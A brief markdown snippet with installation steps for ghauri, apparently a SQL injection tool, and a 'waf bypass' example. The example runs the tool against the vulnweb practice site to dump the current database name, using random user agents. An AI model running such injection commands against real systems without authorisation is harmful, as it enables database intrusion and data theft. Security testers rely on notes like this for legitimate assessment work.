### Installation
```
cd /opt/ && sudo git clone https://github.com/r0oth3x49/ghauri.git && cd ghauri/
sudo chmod +x setup.py
sudo python3 -m pip install --upgrade -r requirements.txt --break-system-packages
sudo python3 -m pip install -e . --break-system-packages
sudo python3 setup.py install
cd
ghauri -h
```
### waf bypass

```
ghauri -u "http://testphp.vulnweb.com/artists.php?artist=" --random-agent --force-ssl --level=3 --current-db --batch
```
